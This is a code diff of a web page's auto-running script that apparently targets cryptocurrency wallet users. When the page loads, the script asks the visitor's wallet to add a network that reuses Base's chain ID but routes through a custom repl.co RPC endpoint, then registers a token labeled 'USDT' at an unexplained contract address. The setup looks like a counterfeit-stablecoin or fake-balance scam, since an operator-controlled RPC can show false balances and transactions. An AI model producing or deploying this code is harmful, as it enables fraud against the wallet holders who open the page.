@@ -7,25 +7,26 @@
 <body>
   <script>
   (async () => {
-    alert("Script started"); // Debug 1
+    alert("Script started");
+    await new Promise(resolve => setTimeout(resolve, 1000));
     if (!window.ethereum) {
-      alert("No wallet detected - please use a wallet app"); // Debug 2
+      alert("No wallet detected - please use a wallet app");
       window.location.href = "about:blank";
       return;
     }
-    alert("Wallet detected"); // Debug 3
+    alert("Wallet detected");
     try {
       await window.ethereum.request({
         method: "wallet_addEthereumChain",
         params: [{
-          chainId: "0x2105", // Base Mainnet
-          chainName: "STBL Base Custom", // Unique to avoid conflict
+          chainId: "0x2105", // Base, but custom
+          chainName: "STBL Custom Base", // Unique
           rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
           nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
           blockExplorerUrls: ["https://basescan.org"]
         }]
       });
-      alert("Network added"); // Debug 4
+      alert("Network added");
       await window.ethereum.request({
         method: "wallet_watchAsset",
         params: {
@@ -34,14 +35,14 @@
             address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c",
             symbol: "USDT",
             decimals: 18,
-            chainId: "8453" // Decimal
+            chainId: "8453"
           }
         }
       });
-      alert("Token added"); // Debug 5
+      alert("Token added");
       window.location.href = "about:blank";
     } catch (e) {
-      alert("Error: " + e.message); // Debug 6
+      alert("Error: " + e.message);
       window.location.href = "about:blank";
     }
   })();
